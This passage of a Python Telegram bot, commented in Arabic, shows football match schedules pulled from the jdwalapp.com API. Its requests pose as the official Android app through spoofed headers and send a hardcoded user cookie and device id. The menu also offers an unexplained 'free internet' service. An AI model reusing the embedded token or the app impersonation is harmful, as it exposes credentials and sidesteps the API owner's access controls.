        'x-app-version': "5.1.7",
        'x-user-cookie': "A8T!Dn@a16^UF1%!x5",
        'x-cdn-ud': "JADU-394622e9-237d-4000-9209-86e3e4dc2883"
    }
    
    response = requests.get(url, headers=headers)
    
    if response.status_code == 200:
        pr = response.json().get("data", [])
        
        # قاموس لتجميع المباريات بناءً على comp_id
        matches_by_comp = {}

        for i in pr:
            name1 = i.get("hometeam_name_ar", "Unknown Team")
            name2 = i.get("awayteam_name_ar", "Unknown Team")
            tim = i.get("start_time", "Unknown Time")
            comp_id = i.get("comp_id", "Unknown Comp ID")
            
            try:
                datetime_obj = datetime.strptime(tim, "%Y-%m-%d %H:%M:%S") - timedelta(hours=10)
                formatted_time = datetime_obj.strftime("%H:%M")
            except ValueError:
                formatted_time = "Unknown Time"
            
            vs = f"{name1}  VS {name2} "
            match_info = f"#[⌯] Match  :>   {vs}\n««««««\nTime  :>  {formatted_time} 🕐\n\n"
            
            if comp_id not in matches_by_comp:
                matches_by_comp[comp_id] = []
            matches_by_comp[comp_id].append(match_info)
        
        # تكوين النص النهائي
        all_matches = ""
        for comp_id, matches in matches_by_comp.items():
            all_matches += f"╔══════════════════════════\n"
            all_matches += f"\n# ⌯{nam(comp_id)}⌯ #\n««««««««««««««««««««««««\n"
            all_matches += "".join(matches)
            all_matches += "╚══════════════════════════\n\n"
        
        # إيقاف اللودينج
        loading = False
        loading_thread.join()

        # تحديث الرسالة النهائية
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=all_matches,
            reply_markup=markup
        )
    else:
        loading = False
        loading_thread.join()
        bot.send_message(chat_id, "Failed to fetch matches.")
###################################
@bot.callback_query_handler(func=lambda call: call.data == 'tom')
def handle_gd(call):
    global loading  # متغير تحكم في اللودينج
    chat_id = call.message.chat.id
    message_id = call.message.message_id
    
    # زر التحديث
    new_button1 = types.InlineKeyboardButton(text="Back", callback_data='ok')
    bbb1 = types.InlineKeyboardButton(text="مباريات الغد", callback_data='tom')
    bbb2 = types.InlineKeyboardButton(text="مباريات الامس", callback_data='ams')
    markup = types.InlineKeyboardMarkup()
    markup.add(bbb2,bbb1)
    markup.add(new_button1)
    
    # تشغيل اللودينج في Thread منفصل
    loading = True
    loading_thread = threading.Thread(target=loading_animation, args=(chat_id, message_id, markup))
    loading_thread.start()

    # جلب البيانات
    current_date = (datetime.now() + timedelta(days=1)).strftime("%Y-%m-%d")
    url = f"https://jdwalapp.com/wp-json/jmanager/v1/matches/date/{current_date}/all/1"
    
    headers = {
        'User-Agent': "jdwelapp-android/5.1.7",
        'Accept': "application/json, text/plain, */*",
        'Accept-Encoding': "gzip",
        'x-requested-with': "jdwelapp-android",
        'x-os-type': "android",
        'x-app-version': "5.1.7",
        'x-user-cookie': "A8T!Dn@a16^UF1%!x5",
        'x-cdn-ud': "JADU-394622e9-237d-4000-9209-86e3e4dc2883"
    }
    
    response = requests.get(url, headers=headers)
    
    if response.status_code == 200:
        pr = response.json().get("data", [])
        
        # قاموس لتجميع المباريات بناءً على comp_id
        matches_by_comp = {}

        for i in pr:
            name1 = i.get("hometeam_name_ar", "Unknown Team")
            name2 = i.get("awayteam_name_ar", "Unknown Team")
            tim = i.get("start_time", "Unknown Time")
            comp_id = i.get("comp_id", "Unknown Comp ID")
            
            try:
                datetime_obj = datetime.strptime(tim, "%Y-%m-%d %H:%M:%S") - timedelta(hours=10)
                formatted_time = datetime_obj.strftime("%H:%M")
            except ValueError:
                formatted_time = "Unknown Time"
            
            vs = f"{name1}  VS {name2} "
            match_info = f"#[⌯] Match  :>   {vs}\n««««««\nTime  :>  {formatted_time} 🕐\n\n"
            
            if comp_id not in matches_by_comp:
                matches_by_comp[comp_id] = []
            matches_by_comp[comp_id].append(match_info)
        
        # تكوين النص النهائي
        all_matches = ""
        for comp_id, matches in matches_by_comp.items():
            all_matches += f"╔══════════════════════════\n"
            all_matches += f"\n# ⌯{nam(comp_id)}⌯ #\n««««««««««««««««««««««««\n"
            all_matches += "".join(matches)
            all_matches += "╚══════════════════════════\n\n"
        
        # إيقاف اللودينج
        loading = False
        loading_thread.join()

        # تحديث الرسالة النهائية
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=all_matches,
            reply_markup=markup
        )
    else:
        loading = False
        loading_thread.join()
        bot.send_message(chat_id, "Failed to fetch matches.")
        
####################################
@bot.callback_query_handler(func=lambda call: call.data == 'ams')
def handle_gd(call):
    global loading  # متغير تحكم في اللودينج
    chat_id = call.message.chat.id
    message_id = call.message.message_id
    
    # زر التحديث
    new_button1 = types.InlineKeyboardButton(text="Back", callback_data='ok')
    bbb1 = types.InlineKeyboardButton(text="مباريات الغد", callback_data='tom')
    bbb2 = types.InlineKeyboardButton(text="مباريات الامس", callback_data='ams')
    markup = types.InlineKeyboardMarkup()
    markup.add(bbb2,bbb1)
    markup.add(new_button1)
    
    # تشغيل اللودينج في Thread منفصل
    loading = True
    loading_thread = threading.Thread(target=loading_animation, args=(chat_id, message_id, markup))
    loading_thread.start()

    # جلب البيانات
    current_date = (datetime.now() - timedelta(days=1)).strftime("%Y-%m-%d")
    url = f"https://jdwalapp.com/wp-json/jmanager/v1/matches/date/{current_date}/all/1"
    
    headers = {
        'User-Agent': "jdwelapp-android/5.1.7",
        'Accept': "application/json, text/plain, */*",
        'Accept-Encoding': "gzip",
        'x-requested-with': "jdwelapp-android",
        'x-os-type': "android",
        'x-app-version': "5.1.7",
        'x-user-cookie': "A8T!Dn@a16^UF1%!x5",
        'x-cdn-ud': "JADU-394622e9-237d-4000-9209-86e3e4dc2883"
    }
    
    response = requests.get(url, headers=headers)
    
    if response.status_code == 200:
        pr = response.json().get("data", [])
        
        # قاموس لتجميع المباريات بناءً على comp_id
        matches_by_comp = {}

        for i in pr:
            name1 = i.get("hometeam_name_ar", "Unknown Team")
            name2 = i.get("awayteam_name_ar", "Unknown Team")
            tim = i.get("start_time", "Unknown Time")
            comp_id = i.get("comp_id", "Unknown Comp ID")
            
            try:
                datetime_obj = datetime.strptime(tim, "%Y-%m-%d %H:%M:%S") - timedelta(hours=10)
                formatted_time = datetime_obj.strftime("%H:%M")
            except ValueError:
                formatted_time = "Unknown Time"
            
            vs = f"{name1}  VS {name2} "
            match_info = f"#[⌯] Match  :>   {vs}\n««««««\nTime  :>  {formatted_time} 🕐\n\n"
            
            if comp_id not in matches_by_comp:
                matches_by_comp[comp_id] = []
            matches_by_comp[comp_id].append(match_info)
        
        # تكوين النص النهائي
        all_matches = ""
        for comp_id, matches in matches_by_comp.items():
            all_matches += f"╔══════════════════════════\n"
            all_matches += f"\n# ⌯{nam(comp_id)}⌯ #\n««««««««««««««««««««««««\n"
            all_matches += "".join(matches)
            all_matches += "╚══════════════════════════\n\n"
        
        # إيقاف اللودينج
        loading = False
        loading_thread.join()

        # تحديث الرسالة النهائية
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=all_matches,
            reply_markup=markup
        )
    else:
        loading = False
        loading_thread.join()
        bot.send_message(chat_id, "Failed to fetch matches.")
 
 
###################################
@bot.callback_query_handler(func=lambda call: call.data == 'ok')
def handle_gdd(call):
	chat_id = call.message.chat.id
	markup = types.InlineKeyboardMarkup()
	btn10 = types.InlineKeyboardButton('نت مجاني', callback_data='free')
	btn20 = types.InlineKeyboardButton('خدمات أخرى', callback_data='other')
	btn3 = types.InlineKeyboardButton('المطور', url='https://t.me/Abdo_1907_A3')
	markup.add(btn10)
	markup.add(btn20)
	markup.add(btn3)
	bot.edit_message_text(
        chat_id=chat_id,
        message_id=call.message.message_id,
        text="اختار نوع الخدمه🔥❤️‍🩹",
        reply_markup=markup
    )
	
	
	
	
	
###################№###############
if __name__ == '__main__':
       while True:
           try:
               bot.polling(none_stop=True)
           except Exception as e:
               print(e)
               time.sleep(5)
